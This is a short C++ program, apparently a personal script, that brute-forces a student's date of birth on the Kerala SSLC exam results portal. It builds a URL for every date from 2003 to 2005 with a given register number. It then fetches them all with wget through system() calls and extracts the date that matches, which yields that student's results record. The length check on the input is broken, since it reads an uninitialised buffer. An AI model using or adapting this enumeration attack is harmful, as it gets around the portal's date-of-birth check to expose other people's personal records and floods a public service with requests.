#include <iostream>
#include <cstdlib>
#include <string.h>
using namespace std;
int main(){
	int a,b,c,d,f;
	char g[6];
	cout<<"Enter Register Number:";	
	cin>>d;
	f=strlen(g);
	freopen( "file.txt", "w", stdout );
	if(f<7){
    for(a=2003;a<2006;a++){
		for(b=1;b<13;b++){
		for(c=1;c<32;c++){
		if(b<10&&c<10){cout<<"https://results.kite.kerala.gov.in:446/sslc/XxYyZzReSuLt/XxYyZzReSuLt_3/"<<a<<"0"<<b<<"0"<<c<<d<<".json?regno="<<d<<"\n";}
		else if(b<10&&c>=10){cout<<"https://results.kite.kerala.gov.in:446/sslc/XxYyZzReSuLt/XxYyZzReSuLt_3/"<<a<<"0"<<b<<c<<d<<".json?regno="<<d<<"\n";}
		else if(b>=10&&c<10){cout<<"https://results.kite.kerala.gov.in:446/sslc/XxYyZzReSuLt/XxYyZzReSuLt_3/"<<a<<b<<"0"<<c<<d<<".json?regno="<<d<<"\n";}
		else if(b>=10&&c>=10){cout<<"https://results.kite.kerala.gov.in:446/sslc/XxYyZzReSuLt/XxYyZzReSuLt_3/"<<a<<b<<c<<d<<".json?regno="<<d<<"\n";}
		}
		}
		}}
	else{cout<<"Enter Six Digit Register Number Noob!\n";}
	system("a=$(pwd) && wget -i $a/file.txt");
	system("b=$(sed -n 1p file.txt | cut -c 2-7) && ls *$b > ab.txt && c=$(cut -c 1-8 ab.txt) && echo $c");
	       
	return 0;}

